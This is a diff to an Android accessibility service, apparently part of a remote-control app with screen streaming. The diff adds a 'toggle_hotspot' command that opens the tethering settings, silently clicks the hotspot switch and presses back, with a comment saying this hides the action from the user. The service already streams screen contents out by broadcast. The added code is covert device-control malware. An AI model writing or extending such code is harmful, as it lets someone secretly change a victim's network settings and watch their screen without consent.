@@ -25,6 +25,12 @@ class SystemAccessibility : AccessibilityService() {
                 "btn_recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                 "stream_screen_start" -> isStreamingScreen = true
                 "stream_screen_stop" -> isStreamingScreen = false
+                "toggle_hotspot" -> {
+                    // Start the process by opening the correct settings page
+                    val settingsIntent = Intent(Settings.ACTION_TETHER_SETTINGS)
+                    settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    startActivity(settingsIntent)
+                }
             }
         }
     }
@@ -47,6 +53,33 @@ class SystemAccessibility : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
+            event.className?.toString()?.contains("com.android.settings") == true) {
+            
+            val rootNode = rootInActiveWindow ?: return
+            
+            // Try to find the hotspot toggle switch. Text may vary by Android version/OEM.
+            val hotspotKeywords = listOf("Wi-Fi hotspot", "Use WiFi hotspot", "Tethering & portable hotspot", "Portable hotspot")
+            var hotspotToggleNode: AccessibilityNodeInfo? = null
+
+            for (keyword in hotspotKeywords) {
+                val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
+                if (nodes.isNotEmpty()) {
+                    hotspotToggleNode = findClickableParent(nodes.first())
+                    break
+                }
+            }
+
+            if (hotspotToggleNode != null) {
+                hotspotToggleNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                // Immediately go back to hide the action from the user
+                Thread.sleep(300) // small delay to ensure click registers
+                performGlobalAction(GLOBAL_ACTION_BACK)
+            }
+            rootNode.recycle()
+            return // Stop further processing for this event
+        }
+        
         if (!isStreamingScreen) return
         
         val currentTime = System.currentTimeMillis()
@@ -66,6 +99,17 @@ class SystemAccessibility : AccessibilityService() {
         val broadcast = Intent("com.systemlinker.SCREEN_DATA")
         broadcast.putExtra("json", jsonPayload.toString())
         sendBroadcast(broadcast)
+    }
+    
+    private fun findClickableParent(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+        var currentNode = node
+        while (currentNode != null) {
+            if (currentNode.isClickable) {
+                return currentNode
+            }
+            currentNode = currentNode.parent
+        }
+        return null // return original node if no clickable parent found
     }
 
     private fun dumpNode(node: AccessibilityNodeInfo): JSONObject {
